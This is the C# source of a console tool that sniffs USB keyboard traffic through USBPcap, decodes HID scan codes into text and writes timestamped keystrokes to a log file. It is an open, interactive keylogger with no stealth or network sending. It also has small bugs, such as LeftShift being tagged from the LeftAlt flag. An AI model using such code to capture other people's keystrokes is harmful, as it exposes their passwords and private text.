using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using USBPcapLib;

namespace KeyboardHook
{
	static class Program
	{
		enum ModifierCodes : byte
		{
			LeftControl = 0x01,
			RightControl = 0x10,
			LeftShift = 0x02,
			RightShift = 0x20,
			LeftAlt = 0x04,
			RightAlt = 0x40
		}

		enum KeyCodes : byte
		{


			Tilda = 0x35,

			Minus = 0x2D,
			Equal = 0x2E,
			Backspace = 0x2A,
			Esc = 0x29,
			Enter = 0x28,
			Tab = 0x2B,
			LeftBracket = 0x2F,
			RightBracket = 0x30,
			BackSplash = 0x31,
			Splash = 0x38,
			Semicolon = 0x33,
			Quote = 0x34,
			Comma = 0x36,
			Point = 0x37,
			Space = 0x2C,
			Delete = 0x4C,

			D1 = 0x1E,
			D2 = 0x1F,
			D3 = 0x20,
			D4 = 0x21,
			D5 = 0x22,
			D6 = 0x23,
			D7 = 0x24,
			D8 = 0x25,
			D9 = 0x26,
			D0 = 0x27,

			q = 0x14,
			w = 0x1A,
			e = 0x08,
			r = 0x15,
			t = 0x17,
			y = 0x1c,
			u = 0x18,
			i = 0x0C,
			o = 0x12,
			p = 0x13,
			a = 0x04,
			s = 0x16,
			d = 0x07,
			f = 0x09,
			g = 0x0A,
			h = 0x0B,
			j = 0x0D,
			k = 0x0E,
			l = 0x0F,
			z = 0x1D,
			x = 0x1B,
			c = 0x06,
			v = 0x19,
			b = 0x05,
			n = 0x11,
			m = 0x10,
		}

		private static string fileName = $"D:\\Temp\\{DateTime.Now: dd.MM.yyyy_HH.mm.ss}.log";
		private static Stopwatch inputTimer = Stopwatch.StartNew();
		private static string lastText = string.Empty;

		[STAThread]
		static void Main()
		{
			foreach (var filter in USBPcapClient.find_usbpcap_filters())
			{
				Console.WriteLine(filter);
				Console.WriteLine(USBPcapClient.enumerate_print_usbpcap_interactive(filter));
			}

			Console.Write("Enter filter id: ");
			if (!int.TryParse(Console.ReadLine(), out var filterId))
			{
				Console.WriteLine("Incorrect filter id!!!");
				return;
			}

			Console.Write("Enter device id: ");
			if (!int.TryParse(Console.ReadLine(), out var deviceId))
			{
				Console.WriteLine("Incorrect device id!!!");
				return;
			}

			var usbClient = new USBPcapClient($@"\\.\USBPcap{filterId}", deviceId);
			usbClient.DataRead += OnDataRead;
			usbClient.start_capture();
			while (true)
			{
				Thread.Sleep(1);
			}
		}

		private static void OnDataRead(object sender, DataEventArgs e)
		{
			var data = e.Data;
			if (data is null || (data.Length != 8))
				return;

			var modifiersCode = data[0];
			var keyCode = data[2];
			if (keyCode == 0)
				return;

			var isLeftAlt = (modifiersCode & (byte)ModifierCodes.LeftAlt) == (byte)ModifierCodes.LeftAlt;
			var isRightAlt = (modifiersCode & (byte)ModifierCodes.RightAlt) == (byte)ModifierCodes.RightAlt;
			var isLeftShift = (modifiersCode & (byte)ModifierCodes.LeftShift) == (byte)ModifierCodes.LeftShift;
			var isRightShift = (modifiersCode & (byte)ModifierCodes.RightShift) == (byte)ModifierCodes.RightShift;
			var isLeftControl = (modifiersCode & (byte)ModifierCodes.LeftControl) == (byte)ModifierCodes.LeftControl;
			var isRightControl = (modifiersCode & (byte)ModifierCodes.RightControl) == (byte)ModifierCodes.RightControl;
			var isShift = isRightShift || isLeftShift;
			string keyText;
			switch ((KeyCodes)keyCode)
			{
				case KeyCodes.Tilda:
					keyText = isShift ? "~" : "`";
					break;
				case KeyCodes.Minus:
					keyText = isShift ? "_" : "-";
					break;
				case KeyCodes.Equal:
					keyText = isShift ? "+" : "=";
					break;
				case KeyCodes.Backspace:
					keyText = "<Backspace>";
					break;
				case KeyCodes.Esc:
					keyText = "<Escape";
					break;
				case KeyCodes.Enter:
					keyText = "<Enter>";
					break;
				case KeyCodes.Tab:
					keyText = "<Tab>";
					break;
				case KeyCodes.LeftBracket:
					keyText = isShift ? "{" : "[";
					break;
				case KeyCodes.RightBracket:
					keyText = isShift ? "}" : "]";
					break;
				case KeyCodes.BackSplash:
					keyText = isShift ? "|" : "\\";
					break;
				case KeyCodes.Splash:
					keyText = isShift ? "?" : "/";
					break;
				case KeyCodes.Semicolon:
					keyText = isShift ? ":" : ";";
					break;
				case KeyCodes.Quote:
					keyText = isShift ? "\"" : "\'";
					break;
				case KeyCodes.Comma:
					keyText = isShift ? "<" : ",";
					break;
				case KeyCodes.Point:
					keyText = isShift ? ">" : ".";
					break;
				case KeyCodes.Space:
					keyText = "<Space>";
					break;
				case KeyCodes.Delete:
					keyText = "<Delete>";
					break;
				case KeyCodes.D1:
					keyText = isShift ? "!" : "1";
					break;
				case KeyCodes.D2:
					keyText = isShift ? "@" : "2";
					break;
				case KeyCodes.D3:
					keyText = isShift ? "#" : "3";
					break;
				case KeyCodes.D4:
					keyText = isShift ? "$" : "4";
					break;
				case KeyCodes.D5:
					keyText = isShift ? "%" : "5";
					break;
				case KeyCodes.D6:
					keyText = isShift ? "^" : "6";
					break;
				case KeyCodes.D7:
					keyText = isShift ? "&" : "7";
					break;
				case KeyCodes.D8:
					keyText = isShift ? "*" : "8";
					break;
				case KeyCodes.D9:
					keyText = isShift ? "(" : "9";
					break;
				case KeyCodes.D0:
					keyText = isShift ? ")" : "0";
					break;
				case KeyCodes.q:
					keyText = isShift ? "Q" : "q";
					break;
				case KeyCodes.w:
					keyText = isShift ? "W" : "w";
					break;
				case KeyCodes.e:
					keyText = isShift ? "E" : "e";
					break;
				case KeyCodes.r:
					keyText = isShift ? "R" : "r";
					break;
				case KeyCodes.t:
					keyText = isShift ? "T" : "t";
					break;
				case KeyCodes.y:
					keyText = isShift ? "Y" : "y";
					break;
				case KeyCodes.u:
					keyText = isShift ? "U" : "u"; 
					break;
				case KeyCodes.i:
					keyText = isShift ? "I" : "i";
					break;
				case KeyCodes.o:
					keyText = isShift ? "O" : "o";
					break;
				case KeyCodes.p:
					keyText = isShift ? "P" : "p";
					break;
				case KeyCodes.a:
					keyText = isShift ? "A" : "a";
					break;
				case KeyCodes.s:
					keyText = isShift ? "S" : "s";
					break;
				case KeyCodes.d:
					keyText = isShift ? "D" : "d";
					break;
				case KeyCodes.f:
					keyText = isShift ? "F" : "f";
					break;
				case KeyCodes.g:
					keyText = isShift ? "G" : "g";
					break;
				case KeyCodes.h:
					keyText = isShift ? "H" : "h";
					break;
				case KeyCodes.j:
					keyText = isShift ? "J" : "j";
					break;
				case KeyCodes.k:
					keyText = isShift ? "K" : "k";
					break;
				case KeyCodes.l:
					keyText = isShift ? "L" : "l";
					break;
				case KeyCodes.z:
					keyText = isShift ? "Z" : "z";
					break;
				case KeyCodes.x:
					keyText = isShift ? "X" : "x";
					break;
				case KeyCodes.c:
					keyText = isShift ? "C" : "c";
					break;
				case KeyCodes.v:
					keyText = isShift ? "V" : "v";
					break;
				case KeyCodes.b:
					keyText = isShift ? "B" : "b";
					break;
				case KeyCodes.n:
					keyText = isShift ? "N" : "n";
					break;
				case KeyCodes.m:
					keyText = isShift ? "M" : "m";
					break;
				default:
					keyText = $"0x{keyCode:X2}";
					break;
			}

			var stringBuilder = new StringBuilder();
			if (inputTimer.ElapsedMilliseconds >= 5000)
			{
				inputTimer.Restart();
				if (!string.IsNullOrEmpty(lastText))
				{
					stringBuilder.AppendLine();
					stringBuilder.AppendLine($"Last text input: {lastText}");
					stringBuilder.AppendLine();
				}
				lastText = string.Empty;
			}
			lastText += keyText;

			stringBuilder.Append(DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss"));
			stringBuilder.Append('\t');
			stringBuilder.Append(keyText);
			stringBuilder.Append('\t');
			if (isLeftAlt)
				stringBuilder.Append("<LeftAlt>\t");
			if (isRightAlt)
				stringBuilder.Append("<RightAlt>\t");
			if (isLeftAlt)
				stringBuilder.Append("<LeftShift>\t");
			if (isRightShift)
				stringBuilder.Append("<RightShift>\t");
			if (isLeftControl)
				stringBuilder.Append("<LeftControl>\t");
			if (isRightControl)
				stringBuilder.Append("<RightControl>\t");
			stringBuilder.AppendLine();

			var logText = stringBuilder.ToString();
			Console.WriteLine(logText);
			File.AppendAllText(fileName, logText);
			//Console.WriteLine(BitConverter.ToString(e.Data));
		}
	}
}
